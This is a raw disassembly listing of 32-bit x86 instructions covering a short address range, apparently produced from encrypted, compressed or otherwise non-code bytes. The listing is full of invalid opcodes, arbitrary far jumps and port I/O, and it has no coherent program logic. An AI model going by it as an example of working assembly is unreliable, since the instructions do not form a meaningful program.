  40a97b:	imul   ebx,DWORD PTR [eax],0xffffffc7
  40a97e:	std    
  40a97f:	jno    0x40a974
  40a981:	(bad)  
  40a982:	push   eax
  40a983:	inc    esi
  40a984:	nop
  40a985:	inc    eax
  40a986:	push   ss
  40a987:	sbb    al,0x70
  40a989:	ss dec esi
  40a98b:	(bad)  
  40a98c:	sub    BYTE PTR [ebp-0x41],cl
  40a98f:	push   ebx
  40a990:	mov    ecx,0x487cc07b
  40a995:	retf   0x2f46
  40a998:	loope  0x40aa15
  40a99a:	int    0x44
  40a99c:	jge    0x40a96b
  40a99e:	sbb    ecx,DWORD PTR ds:0x510ed53a
  40a9a4:	dec    edx
  40a9a5:	imul   BYTE PTR [ebx-0x80]
  40a9a8:	push   0xd0b2e1f3
  40a9ad:	fld    DWORD PTR [esi-0x77fd2a47]
  40a9b3:	ds push ebx
  40a9b5:	dec    eax
  40a9b6:	jmp    0x7fd2:0x1fee1e3d
  40a9bd:	add    al,0x9e
  40a9bf:	mov    esp,0x7d22bbbc
  40a9c4:	inc    edi
  40a9c5:	mov    dl,0xb5
  40a9c7:	lock rcl BYTE PTR [ecx-0x27f7162e],0x27
  40a9cf:	or     edx,DWORD PTR [edx]
  40a9d1:	mov    WORD PTR [ecx+0x348edd65],gs
  40a9d7:	pushf  
  40a9d8:	add    esi,edx
  40a9da:	jle    0x40a9b2
  40a9dc:	shl    BYTE PTR [eax-0x216c027a],0x38
  40a9e3:	fs mov bh,0x4c
  40a9e6:	stos   DWORD PTR es:[edi],eax
  40a9e7:	jle    0x40aa5f
  40a9e9:	xor    dl,bl
  40a9eb:	ret    
  40a9ec:	push   ds
  40a9ed:	or     ah,BYTE PTR [ebx-0x14]
  40a9f0:	(bad)  
  40a9f1:	ja     0x40a9b1
  40a9f3:	(bad)  
  40a9f5:	push   edx
  40a9f6:	inc    esp
  40a9f7:	fadd   QWORD PTR [ebp+0x703fe0ca]
  40a9fd:	ret    
  40a9fe:	mov    WORD PTR [esi+0x7d43be98],?
  40aa04:	imul   edx,DWORD PTR [ebx-0x13],0xcb889d06
  40aa0b:	xchg   ecx,eax
  40aa0c:	nop
  40aa0d:	es sub al,0x33
  40aa10:	or     dl,dh
  40aa12:	fs test bh,ah
  40aa15:	add    DWORD PTR [ebp+ecx*4-0x7f],ecx
  40aa19:	jl     0x40aa85
  40aa1b:	mov    edx,0x7b6eae82
  40aa20:	out    0x56,al
  40aa22:	jmp    0x6e0b:0xf020be30
  40aa29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa2a:	push   ds
  40aa2b:	inc    ecx
  40aa2c:	push   esp
  40aa2d:	sub    cl,BYTE PTR [ebp+0x3c]
  40aa30:	into   
  40aa31:	pop    ecx
  40aa32:	push   cs
  40aa33:	ds cmp eax,0x330cb6c1
  40aa39:	rcl    BYTE PTR [edi-0x2a],cl
  40aa3c:	mov    edi,DWORD PTR [esi-0x2caff31]
  40aa42:	int3   
  40aa43:	push   ds
  40aa44:	cwde   
  40aa45:	aad    0xd0
  40aa47:	mov    ds:0x1535c960,eax
  40aa4c:	dec    ecx
  40aa4d:	jae    0x40aa85
  40aa4f:	(bad)  
  40aa50:	or     DWORD PTR [ecx+0x2],esp
  40aa53:	imul   edi,DWORD PTR [edx-0x47],0xd02d43db
  40aa5a:	test   eax,0x7d4b0c84
  40aa5f:	in     eax,dx
  40aa60:	push   esp
  40aa61:	sub    ch,dh
  40aa63:	(bad)  
  40aa65:	or     al,0xd2
  40aa67:	lock pop ds
  40aa69:	js     0x40aa6f
  40aa6b:	jmp    0x9e3bd644
  40aa70:	jae    0x40aa7d
  40aa72:	pop    ss
  40aa73:	out    dx,al
  40aa74:	bound  edx,QWORD PTR [ebp+0x43ef7946]
  40aa7a:	(bad)  
  40aa7b:	adc    eax,0xe2a8583f
  40aa80:	or     al,0x45
  40aa82:	rol    DWORD PTR [edi-0x602148f6],cl
  40aa88:	inc    ebp
  40aa89:	bound  ebx,QWORD PTR [edi]
  40aa8b:	popw   ds
  40aa8d:	int3   
  40aa8e:	mov    bl,0x55
  40aa90:	(bad)  
  40aa91:	test   al,0x56
  40aa93:	xor    eax,0x8750f4ed
  40aa98:	lahf   
  40aa99:	lds    edx,FWORD PTR [esi+0x7d1ae913]
  40aa9f:	sbb    eax,0x4ce4b93d
  40aaa4:	xor    DWORD PTR [esi-0x6d],ecx
  40aaa7:	push   0xe0cb0bf5
  40aaac:	pusha  
  40aaad:	pop    esi
  40aaae:	add    DWORD PTR [esp+ecx*2-0x3f755589],eax
  40aab5:	fcmove st,st(5)
  40aab7:	stos   DWORD PTR es:[edi],eax
  40aab8:	jnp    0x40aa44
  40aaba:	dec    edx
  40aabb:	(bad)  
  40aabc:	idiv   DWORD PTR [edi-0x7e]
  40aabf:	dec    esp
  40aac0:	shr    bl,1
  40aac2:	adc    eax,0xe658c66b
  40aac7:	fnsave [esi]
  40aac9:	cli    
  40aaca:	lea    eax,[ebp-0x5b]
  40aacd:	push   ebx
  40aace:	xor    ah,BYTE PTR [edi]
  40aad0:	push   edx
  40aad1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aad2:	jl     0x40aa84
  40aad4:	pop    ds
  40aad5:	jge    0x40ab22
  40aad7:	push   0xcc2c6f3f
  40aadc:	into   
  40aadd:	arpl   bx,sp
  40aadf:	xchg   ebp,eax
  40aae0:	or     BYTE PTR [ecx+0x31],bh
  40aae3:	(bad)  
  40aae4:	test   al,0x25
  40aae6:	cld    
  40aae7:	and    bl,BYTE PTR [ebx]
  40aae9:	jmp    0x956c:0xe5a4668e
  40aaf0:	mov    ds:0x29d90fc0,eax
  40aaf5:	out    0xff,al
  40aaf7:	(bad)  
  40aaf8:	jns    0x40ab23
  40aafa:	dec    esi
  40aafb:	push   esp
  40aafc:	inc    edx
  40aafd:	rol    DWORD PTR [ebx],1
  40aaff:	and    cl,BYTE PTR [eax]
  40ab01:	or     DWORD PTR [esp+ebx*4-0x32],0xc1a53c47
  40ab09:	cmp    ebx,DWORD PTR [esi+0x91ee443]
  40ab0f:	adc    edx,0xf79e345e
  40ab15:	popa   
  40ab16:	aad    0xfc
  40ab18:	lahf   
  40ab19:	out    dx,al
  40ab1a:	add    al,bh
  40ab1c:	and    BYTE PTR [edi],al
  40ab1e:	int    0x3f
  40ab20:	pop    esp
  40ab21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab22:	xor    DWORD PTR [edx+0x543f9a1e],ebp
  40ab28:	mov    al,ds:0x84e28579
  40ab2d:	xor    DWORD PTR [ecx+0x6e],ebx
  40ab30:	sbb    BYTE PTR [ecx+0x2c611942],ah
  40ab36:	bound  ebx,QWORD PTR [edi-0x46fe3bc2]
  40ab3c:	les    esp,FWORD PTR [ebp+0x5f5cbf6d]
  40ab42:	pop    edi
  40ab43:	clc    
  40ab44:	jae    0x40aba0
  40ab46:	jo     0x40ab23
  40ab48:	seta   BYTE PTR cs:[edi-0x8]
  40ab4d:	(bad)  
  40ab4e:	pop    esi
  40ab4f:	fwait
  40ab50:	fwait
  40ab51:	dec    esp
  40ab52:	xchg   esp,eax
  40ab53:	mov    ebp,0xf80cc801
  40ab58:	ds retf 0x81af
  40ab5c:	mov    edi,0xae83ba89
  40ab61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab62:	js     0x40abc6
  40ab64:	jl     0x40ab30
  40ab66:	add    BYTE PTR [ecx-0x3b5e5389],al
  40ab6c:	push   edx
  40ab6d:	mov    eax,ds:0x9b0fb19b
  40ab72:	loopne 0x40ab71
  40ab74:	shr    BYTE PTR [eax-0x5b],cl
  40ab77:	mov    es,WORD PTR gs:[ebx]
  40ab7a:	fstp   QWORD PTR [eax]
  40ab7c:	mov    dh,0x29
  40ab7e:	shl    eax,0xd2
  40ab81:	inc    ecx
  40ab82:	mov    fs,WORD PTR [ebp-0x33]
  40ab85:	aad    0x12
  40ab87:	dec    esp
  40ab88:	xchg   edx,eax
  40ab89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab8a:	out    dx,al
  40ab8b:	iret   
  40ab8c:	(bad)  
  40ab8d:	stc    
  40ab8e:	jb     0x40ab3a
  40ab90:	sub    al,0xd1
  40ab92:	and    bh,BYTE PTR [eax]
  40ab94:	int3   
  40ab95:	push   0x4fbafaff
  40ab9a:	pop    es
  40ab9b:	cwde   
  40ab9c:	sbb    dl,bh
  40ab9e:	stos   DWORD PTR es:[edi],eax
  40ab9f:	mov    cl,0xbf
  40aba1:	mov    gs,WORD PTR [ecx]
  40aba3:	in     eax,0x95
  40aba5:	pop    ebp
  40aba6:	add    eax,eax
  40aba8:	mov    al,0x9b
  40abaa:	pop    ss
  40abab:	aad    0x45
  40abad:	shl    DWORD PTR [edx],0x59
  40abb0:	popf   
  40abb1:	enter  0x8ede,0xb7
  40abb5:	mov    eax,ds:0x92ac7e16
  40abba:	call   0x9bd0:0x12c50a83
  40abc1:	sbb    al,0xbb
  40abc3:	mov    dh,BYTE PTR [ebp+0x71ecfbfb]
  40abc9:	jb     0x40abbb
  40abcb:	mov    ebp,0x3ceecdd9
  40abd0:	mov    ?,WORD PTR [ebx-0x3b]
  40abd3:	xchg   ebp,eax
  40abd4:	push   0xffffff98
  40abd6:	cwd    
  40abd8:	push   ebp
  40abd9:	retf   0xaaec
  40abdc:	lods   eax,DWORD PTR ds:[esi]
  40abdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abde:	pop    ecx
  40abdf:	int    0x4e
  40abe1:	lea    ecx,[ebx+0x71]
  40abe4:	dec    ecx
  40abe5:	cmp    ebx,DWORD PTR [eax+0x440e3036]
  40abeb:	idiv   BYTE PTR [eax-0x4cb4b91c]
  40abf1:	dec    edi
  40abf2:	mov    eax,0xef3faae1
  40abf7:	fimul  WORD PTR [ecx+0x71]
  40abfa:	ins    DWORD PTR es:[edi],dx
  40abfb:	dec    eax
  40abfc:	out    0x15,eax
  40abfe:	xchg   esi,eax
  40abff:	leave  
  40ac00:	and    al,0x39
  40ac02:	jecxz  0x40ac4e
  40ac04:	sub    edx,DWORD PTR [edx-0x6e26d6d4]
  40ac0a:	mov    al,0x99
  40ac0c:	xlat   BYTE PTR ds:[ebx]
  40ac0d:	mov    dh,0x13
  40ac0f:	test   dh,al
  40ac11:	add    edi,DWORD PTR [edi+eiz*8+0x50]
  40ac15:	dec    ecx
  40ac16:	pop    esp
  40ac17:	push   es
  40ac18:	cli    
  40ac19:	xchg   ebp,eax
  40ac1a:	dec    esi
  40ac1b:	jbe    0x40ac02
  40ac1d:	or     DWORD PTR [esi],ebp
  40ac1f:	(bad)  
  40ac20:	int    0xd2
  40ac22:	cwde   
  40ac23:	fild   QWORD PTR [edx+0x2a7d293f]
  40ac29:	addr16 or eax,0xa909f3c4
  40ac2f:	in     eax,dx
  40ac30:	dec    esp
  40ac31:	jns    0x40ac67
  40ac33:	push   edi
  40ac34:	inc    ecx
  40ac35:	imul   ecx,DWORD PTR [ecx-0x62],0xf6b6f1aa
  40ac3c:	sub    edx,DWORD PTR [esi-0x312ee121]
  40ac42:	mov    edx,0x72194bf1
  40ac47:	sahf   
  40ac48:	ret    0xbb26
  40ac4b:	stos   BYTE PTR es:[edi],al
  40ac4c:	inc    edx
  40ac4d:	fstp   DWORD PTR [ebp+eax*1-0x7]
  40ac51:	imul   eax,eax,0x405a200c
  40ac57:	mov    ch,0xa8
  40ac59:	sbb    cl,bl
  40ac5b:	inc    esi
  40ac5c:	jno    0x40acd0
  40ac5e:	int3   
  40ac5f:	hlt    
  40ac60:	and    al,0x3b
  40ac62:	int    0xd8
  40ac64:	popa   
  40ac65:	int    0x1e
  40ac67:	mov    WORD PTR [edx+0x70e7ed27],?
  40ac6d:	sbb    DWORD PTR [edx],0x5c
  40ac70:	aam    0x64
  40ac72:	and    eax,0xe0a3f3ee
  40ac77:	jmp    0x40ac78
  40ac79:	repz xchg esi,eax
  40ac7b:	mov    WORD PTR [edx],?
  40ac7d:	(bad)  
  40ac7e:	lods   al,BYTE PTR ds:[esi]
  40ac7f:	sub    al,0x3f
  40ac81:	pop    ebx
  40ac82:	out    0xeb,al
  40ac84:	xor    DWORD PTR [ecx+eiz*1-0x24],0xe830b994
  40ac8c:	sar    edi,1
  40ac8e:	push   ss
  40ac8f:	or     al,0x24
  40ac91:	out    dx,eax
  40ac92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac93:	call   0xd45f:0x9c62e649
  40ac9a:	push   cs
  40ac9b:	out    0x2c,eax
  40ac9d:	cld    
  40ac9e:	inc    esp
  40ac9f:	cld    
  40aca0:	enter  0x9feb,0x9a
  40aca4:	pop    ds
  40aca5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aca6:	pop    edi
  40aca7:	cmp    al,0xb3
  40aca9:	or     BYTE PTR [edx+0x6f],dh
  40acac:	fidiv  DWORD PTR [edx+0x46]
  40acaf:	dec    ebx
  40acb0:	or     BYTE PTR [edi-0x73],bl
  40acb3:	xor    al,BYTE PTR [edx+eiz*2]
  40acb6:	icebp  
  40acb7:	clc    
  40acb8:	push   0xffffffac
  40acba:	xchg   DWORD PTR [eax+0x549f31ac],eax
  40acc0:	jne    0x40ace1
  40acc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acc3:	dec    esi
  40acc4:	iret   
  40acc5:	dec    edx
  40acc6:	xlat   BYTE PTR ds:[ebx]
  40acc7:	in     eax,0x9d
  40acc9:	and    al,0x6d
  40accb:	jns    0x40ad31
  40accd:	jnp    0x40ac5c
  40accf:	jno    0x40acb3
  40acd1:	outs   dx,DWORD PTR ds:[esi]
  40acd2:	jl     0x40ad39
  40acd4:	push   esi
  40acd5:	sbb    ah,BYTE PTR [ebx+0x2374c0db]
  40acdb:	aam    0xa1
  40acdd:	out    dx,eax
  40acde:	inc    esi
  40acdf:	call   0x1ae9:0xee8cd0d9
  40ace6:	test   DWORD PTR [ebx-0x82640b5],ebp
  40acec:	imul   esi,DWORD PTR [esi],0x4a
  40acef:	mov    cl,0xad
  40acf1:	cs or  al,0xc7
  40acf4:	repz pusha 
  40acf6:	ret    
  40acf7:	shr    BYTE PTR [ebx-0x66],0x3c
  40acfb:	dec    edi
  40acfc:	dec    esi
  40acfd:	pushf  
  40acfe:	mov    dl,0xd6
  40ad00:	mov    DWORD PTR [edi+0x15],esi
  40ad03:	fisttp QWORD PTR [ecx+0x13]
  40ad06:	add    BYTE PTR [edx-0x3528cdc4],bh
  40ad0c:	mov    DWORD PTR [ebx+0x7c],ecx
  40ad0f:	mov    eax,0xc8db3e21
  40ad14:	test   eax,0xd4304e65
  40ad19:	mov    bh,0xf8
  40ad1b:	into   
  40ad1c:	sahf   
  40ad1d:	shr    BYTE PTR [ebx+0x8c4a777],0xbf
  40ad24:	pop    edx
  40ad25:	rcr    DWORD PTR [edx],0x9b
  40ad28:	retf   
  40ad29:	ins    DWORD PTR es:[edi],dx
  40ad2a:	gs push esi
  40ad2c:	cmp    eax,0xd2f6c017
  40ad31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad32:	cmc    
  40ad33:	jle    0x40ad4a
  40ad35:	lods   al,BYTE PTR ds:[esi]
  40ad36:	jecxz  0x40ad6a
  40ad38:	arpl   WORD PTR [edx-0x11],bx
  40ad3b:	mov    bh,0x97
  40ad3d:	add    ch,BYTE PTR [esi+eiz*4]
  40ad40:	pusha  
  40ad41:	pop    es
  40ad42:	inc    edi
  40ad43:	cmp    ah,BYTE PTR [ecx+0xc]
  40ad46:	push   cs
  40ad47:	push   ss
  40ad48:	sub    BYTE PTR [edx-0x5b42760b],dl
  40ad4e:	hlt    
  40ad4f:	mov    bl,0xd4
  40ad51:	sub    al,0x36
  40ad53:	cmc    
  40ad54:	aaa    
  40ad55:	out    dx,al
  40ad56:	(bad)  
  40ad57:	ret    
  40ad58:	cmp    ecx,DWORD PTR [edi]
  40ad5a:	retf   
  40ad5b:	fsubr  QWORD PTR [eax-0x54c13fbf]
  40ad61:	and    BYTE PTR [ebp+0x9],0x4f
  40ad65:	jecxz  0x40ace7
  40ad67:	icebp  
  40ad68:	mov    ds:0x7875ec0a,eax
  40ad6d:	scas   al,BYTE PTR es:[edi]
  40ad6e:	xchg   ebp,eax
  40ad6f:	repnz test edx,edi
  40ad72:	adc    bh,0x4d
  40ad75:	into   
  40ad76:	sbb    edx,DWORD PTR [eax]
  40ad78:	jbe    0x40ada4
  40ad7a:	in     al,dx
  40ad7b:	inc    edi
  40ad7c:	dec    ecx
  40ad7d:	xchg   esi,eax
  40ad7e:	jg     0x40ada7
  40ad80:	xchg   ebp,eax
  40ad81:	(bad)  
  40ad83:	pop    ebp
  40ad84:	aad    0x73
  40ad86:	adc    BYTE PTR [esi],0xf5
  40ad89:	mov    edi,0x4e95199c
  40ad8e:	xchg   esp,eax
  40ad8f:	mov    fs,WORD PTR [eax]
  40ad91:	lods   al,BYTE PTR ds:[esi]
  40ad92:	ficom  DWORD PTR [edi+0x3d]
  40ad95:	out    dx,eax
  40ad96:	shl    DWORD PTR [esi+ebx*8+0x3a],1
  40ad9a:	xor    bl,BYTE PTR [ecx]
  40ad9c:	adc    ebp,DWORD PTR [ecx]
  40ad9e:	icebp  
  40ad9f:	test   eax,0x92c7d670
  40ada4:	sbb    al,0x7b
  40ada6:	retf   0x32b
  40ada9:	and    bh,0xb2
  40adac:	add    cl,BYTE PTR [edx+0x63]
  40adaf:	xor    eax,0xb13411f4
  40adb4:	lea    esp,[eax-0x15a8cfcf]
  40adba:	pushf  
  40adbb:	das    
  40adbc:	xchg   ebx,eax
  40adbd:	mov    al,ds:0xd58a5343
  40adc2:	test   al,0x7e
  40adc4:	lock shl DWORD PTR [esi-0x28583546],cl
  40adcb:	lahf   
  40adcc:	jge    0x40ae4a
  40adce:	loop   0x40ae1f
  40add0:	pushf  
  40add1:	cmp    bh,BYTE PTR [ecx]
  40add3:	dec    edi
  40add4:	rcr    BYTE PTR [edi-0xc9c1de1],1
  40adda:	mov    esp,0x1bcef6a3
  40addf:	dec    esp
  40ade0:	mov    al,ds:0x7823271d
  40ade5:	out    0xaa,al
  40ade7:	cmp    BYTE PTR [edx],al
  40ade9:	call   0x57cdc649
  40adee:	mov    bh,0x3d
  40adf0:	cwde   
  40adf1:	mov    eax,0x2d871d2
  40adf6:	ror    BYTE PTR [edi-0x2e36ce4],1
  40adfc:	and    bh,BYTE PTR [ecx+ebx*2+0x72aa6cab]
  40ae03:	xlat   BYTE PTR ds:[ebx]
  40ae04:	mov    eax,0x426ab0f2
  40ae09:	pop    esi
  40ae0a:	retf   
  40ae0b:	sub    DWORD PTR [eax+0x7e6ea177],eax
  40ae11:	xor    edi,DWORD PTR [ebx-0x24ad8d26]
  40ae17:	pop    edx
  40ae18:	lock icebp 
  40ae1a:	push   0x79
  40ae1c:	adc    al,0x97
  40ae1e:	and    al,0x56
  40ae20:	iret   
  40ae21:	das    
  40ae22:	fidivr DWORD PTR [esi+edi*8-0x4b]
  40ae26:	out    0x72,eax
  40ae28:	xor    DWORD PTR [edx-0x70c8af08],edi
  40ae2e:	(bad)  
  40ae2f:	pop    ebx
  40ae30:	cmp    bl,bl
  40ae32:	push   0xd
  40ae34:	and    al,0x6f
  40ae36:	fiadd  WORD PTR [ebx-0x30ec6e05]
  40ae3c:	and    eax,0x500c55b1
  40ae41:	xor    dl,bh
  40ae43:	sbb    ch,BYTE PTR cs:[ecx-0x2767f396]
  40ae4a:	pop    ecx
  40ae4b:	pop    edi
  40ae4c:	dec    edi
  40ae4d:	and    al,bl
  40ae4f:	add    BYTE PTR [ebx-0x79],0xf1
  40ae53:	or     BYTE PTR [ebx],dh
  40ae55:	sub    BYTE PTR [ebx],cl
  40ae57:	dec    ecx
  40ae58:	push   ecx
  40ae59:	outs   dx,BYTE PTR ds:[esi]
  40ae5a:	pop    eax
  40ae5b:	out    0x1a,al
  40ae5d:	pop    ebx
  40ae5e:	push   ecx
  40ae5f:	sbb    eax,0xc22f33d1
  40ae64:	or     DWORD PTR [eax],eax
  40ae66:	loope  0x40aea3
  40ae68:	lock mov esi,0x29970d8a
  40ae6e:	fs pop eax
  40ae70:	or     al,0xc0
  40ae72:	xchg   edx,eax
  40ae73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae74:	push   eax
  40ae75:	dec    esi
  40ae76:	ret    
  40ae77:	xchg   edx,eax
  40ae78:	test   eax,0xa6e22a13
  40ae7d:	outs   dx,BYTE PTR ds:[esi]
  40ae7e:	add    edx,edi
  40ae80:	cmp    BYTE PTR ds:0xa33b3465,bl
  40ae86:	fisttp QWORD PTR [eax-0x3d]
  40ae89:	mov    bh,0xc5
  40ae8b:	cs inc edx
  40ae8d:	push   esp
  40ae8e:	lods   al,BYTE PTR ds:[esi]
  40ae8f:	iret   
  40ae90:	imul   esp,DWORD PTR [esi-0x7e38578a],0x1ddef285
  40ae9a:	cmp    BYTE PTR gs:[ebx+edi*2+0x4],0x6d
  40aea0:	popf   
  40aea1:	cmc    
  40aea2:	inc    ebp
  40aea3:	push   edi
  40aea4:	sbb    eax,0x1b7ea128
  40aea9:	pop    esi
  40aeaa:	add    al,0x33
  40aeac:	add    BYTE PTR [ebp+0x46],dl
  40aeaf:	mov    cl,ah
  40aeb1:	adc    ebp,DWORD PTR [esi]
  40aeb3:	dec    ebx
  40aeb4:	fisttp DWORD PTR [eax]
  40aeb6:	int3   
  40aeb7:	sbb    al,0x4b
  40aeb9:	es jmp 0xad262b18
  40aebf:	push   edi
  40aec0:	dec    esp
  40aec1:	and    eax,0xcbfb16bf
  40aec6:	test   eax,0x3caf28e2
  40aecb:	or     BYTE PTR [ebp+0xa4e537f],al
  40aed1:	inc    ebx
  40aed2:	dec    esp
  40aed3:	int3   
  40aed4:	lea    ebx,[ebx-0x66]
  40aed7:	pop    edi
  40aed8:	pop    edx
  40aed9:	xchg   esp,eax
  40aeda:	loope  0x40af5a
  40aedc:	scas   eax,DWORD PTR es:[edi]
  40aedd:	push   es
  40aede:	(bad)  
  40aedf:	cmp    eax,0xcb4c3aa7
  40aee4:	mov    ?,WORD PTR [eax]
  40aee6:	pop    ss
  40aee7:	or     eax,0x56edbf43
  40aeec:	sub    BYTE PTR ds:0xb1c2c4d3,0x75
  40aef3:	mov    al,0xb9
  40aef5:	mov    cl,0x25
  40aef7:	pop    ebx
  40aef8:	adc    ah,BYTE PTR [eax]
  40aefa:	pop    ebx
  40aefb:	in     eax,0x35
  40aefd:	dec    ebp
  40aefe:	xor    DWORD PTR [eax-0x1920d950],eax
  40af04:	xor    eax,0x86dc816c
  40af09:	mov    dl,0x33
  40af0b:	jae    0x40af59
  40af0d:	scas   al,BYTE PTR es:[edi]
  40af0e:	xchg   edi,eax
  40af0f:	nop
  40af10:	bound  ebx,QWORD PTR [eax]
  40af12:	sub    bh,BYTE PTR [edx+0x1ff2c2ba]
  40af18:	mov    eax,0x9410ef3c
  40af1d:	lds    ecx,FWORD PTR [edi]
  40af1f:	daa    
  40af20:	inc    esp
  40af21:	retf   
  40af22:	mov    eax,DWORD PTR [edi]
  40af24:	fistp  QWORD PTR [ebp+0x365fd9d8]
  40af2a:	call   0xbcadd106
  40af2f:	ins    BYTE PTR es:[edi],dx
  40af30:	and    BYTE PTR [ebx+eiz*2],bl
  40af33:	retf   
  40af34:	push   ds
  40af35:	fistp  QWORD PTR [ebx+0x508ee9bd]
  40af3b:	sbb    al,0xa9
  40af3d:	loop   0x40aeee
  40af3f:	ins    DWORD PTR es:[edi],dx
  40af40:	icebp  
  40af41:	rol    BYTE PTR [esi+0x1b],0xe1
  40af45:	xchg   edi,eax
  40af46:	int    0x24
  40af48:	shr    BYTE PTR [eax+ebp*1-0x66],1
  40af4c:	lahf   
  40af4d:	inc    edx
  40af4e:	jnp    0x40afca
  40af50:	lahf   
  40af51:	or     DWORD PTR [eax],0xffffffb2
  40af54:	jb     0x40af88
  40af56:	add    DWORD PTR [edi+esi*1+0x48],esi
  40af5a:	fs dec ecx
  40af5c:	adc    DWORD PTR [edx+0x7f56fb1c],edx
  40af62:	push   esp
  40af63:	cld    
  40af64:	and    ch,BYTE PTR [edx-0x28]
  40af67:	ja     0x40af08
  40af69:	pop    edx
  40af6a:	and    eax,0x18ebefc7
  40af6f:	inc    edx
  40af70:	add    BYTE PTR [ebp+0x2b],0x5c
  40af74:	gs pop esi
  40af76:	(bad)  
  40af77:	fistp  QWORD PTR [edi-0x5d7c98fb]
  40af7d:	cmp    BYTE PTR [eax-0x49],bl
  40af80:	idiv   BYTE PTR [ebp-0x7e38bf1d]
  40af86:	in     eax,dx
  40af87:	fdivr  st,st(2)
  40af89:	xor    ebp,DWORD PTR [ebp-0x28]
  40af8c:	clc    
  40af8d:	pushf  
  40af8e:	xor    DWORD PTR [ebx-0x32d0d05c],ebp
  40af94:	push   edx
  40af95:	enter  0x5194,0x4c
  40af99:	inc    ecx
  40af9a:	xchg   edi,eax
  40af9b:	jmp    0x40af5e
  40af9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af9e:	scas   eax,DWORD PTR es:[edi]
  40af9f:	les    ebx,FWORD PTR [ecx]
  40afa1:	dec    ecx
  40afa2:	jno    0x40af49
  40afa4:	adc    ch,bh
  40afa6:	gs pop edx
  40afa8:	xchg   ebp,eax
  40afa9:	fbld   TBYTE PTR [edx-0x4e5626b2]
  40afaf:	mov    ebp,0xdf653c35
  40afb4:	fadd   QWORD PTR [ecx]
  40afb6:	jp     0x40af6e
  40afb8:	mov    ecx,0x7f483dcd
  40afbd:	jl     0x40b01e
  40afbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afc0:	retf   0xb923
  40afc3:	aam    0x32
  40afc5:	std    
  40afc6:	arpl   dx,di
  40afc8:	shl    DWORD PTR [ecx],cl
  40afca:	lods   eax,DWORD PTR ds:[esi]
  40afcb:	inc    edx
  40afcc:	push   edi
  40afcd:	push   es
  40afce:	push   ss
  40afcf:	mov    cs,ebx
  40afd1:	inc    ecx
  40afd2:	pop    ss
  40afd3:	dec    esi
  40afd4:	cmc    
  40afd5:	fwait
  40afd6:	test   BYTE PTR [ecx+0x42],0xc8
  40afda:	lods   al,BYTE PTR ds:[esi]
  40afdb:	or     eax,0x56c16786
  40afe0:	(bad)  
  40afe1:	clc    
  40afe2:	mov    ebp,0x77a61343
  40afe7:	gs and esp,edi
  40afea:	aaa    
  40afeb:	inc    esp
  40afec:	test   eax,0xba369486
  40aff1:	jle    0x40af95
  40aff3:	add    al,0x90
  40aff5:	ja     0x40b047
  40aff7:	jo     0x40b072
  40aff9:	sbb    esi,DWORD PTR [eax-0x79]
  40affc:	fcmovne st,st(4)
  40affe:	adc    dl,al
  40b000:	xor    eax,0x3864f525
  40b005:	push   ss
  40b006:	bound  esi,QWORD PTR [esi-0x5a]
  40b009:	and    al,0x9c
  40b00b:	sub    BYTE PTR [edx],bh
  40b00d:	ds or  al,0x7c
  40b011:	std    
  40b012:	sub    eax,DWORD PTR [edi+ecx*2+0x41]
  40b016:	sub    dl,BYTE PTR ds:0xd946e2c2
  40b01c:	test   BYTE PTR [ebp-0xc1b7ef5],al
  40b022:	push   0xffffffe0
  40b024:	xchg   ecx,eax
  40b025:	mov    dh,0x0
  40b027:	jl     0x40b015
  40b029:	cmp    eax,0x75c8e17e
  40b02e:	in     al,0x72
  40b030:	int3   
  40b031:	jl     0x40b007
  40b033:	xor    BYTE PTR ds:0xa1aeeccc,0x54
  40b03a:	fisubr DWORD PTR [esi-0x1]
  40b03d:	mov    ecx,0xdf01eb84
  40b042:	inc    esp
  40b043:	jge    0x40b01a
  40b045:	lahf   
  40b046:	inc    ecx
  40b047:	enter  0x7796,0x83
  40b04b:	dec    esi
  40b04c:	cmp    al,0x56
  40b04e:	loope  0x40b06c
  40b050:	xchg   edx,eax
  40b051:	(bad)  
  40b052:	test   al,0x9f
  40b054:	aas    
  40b055:	sahf   
  40b056:	jns    0x40b0ab
  40b058:	mov    al,ds:0x40020f2b
  40b05d:	pop    edi
  40b05e:	repnz pushf 
  40b060:	fsubr  DWORD PTR [ecx+0x69de4aee]
  40b066:	or     BYTE PTR [edi],bh
  40b068:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b069:	mov    ds,WORD PTR [edi+0x48]
  40b06c:	xchg   ebx,eax
  40b06d:	mov    bh,0x13
  40b06f:	arpl   WORD PTR [ebx],di
  40b071:	mov    sp,0xadea
  40b075:	pop    es
  40b076:	shl    edx,1
  40b078:	ds dec eax
  40b07a:	mov    ch,0xdc
  40b07c:	fldenv ds:[edx-0x71]
  40b080:	sub    ch,ah
  40b082:	and    DWORD PTR [edx-0x582e84ea],0x44
  40b089:	jmp    0x2cd0efef
  40b08e:	sbb    cl,ch
  40b090:	add    ch,dh
  40b092:	mov    bl,0x19
  40b094:	mov    ds:0x12c2bde4,al
  40b099:	jne    0x40b093
  40b09b:	outs   dx,DWORD PTR ds:[esi]
  40b09c:	add    al,0x8d
  40b09e:	loop   0x40b0cb
  40b0a0:	mov    eax,ds:0x306a4ffa
  40b0a5:	aaa    
  40b0a6:	and    eax,0xdc68591
  40b0ab:	ret    0x9dcb
  40b0ae:	pop    es
  40b0af:	push   ss
  40b0b0:	mov    DWORD PTR [ecx],ebp
  40b0b2:	test   eax,0xf70fb71c
  40b0b7:	sbb    bh,BYTE PTR [edx-0x6]
  40b0ba:	into   
  40b0bb:	jmp    0xd8f0:0x19a960ec
  40b0c2:	mov    esi,0x516a8360
  40b0c7:	jmp    0x1eac:0x41885f3a
  40b0ce:	lds    edx,FWORD PTR [ebx]
  40b0d0:	in     al,dx
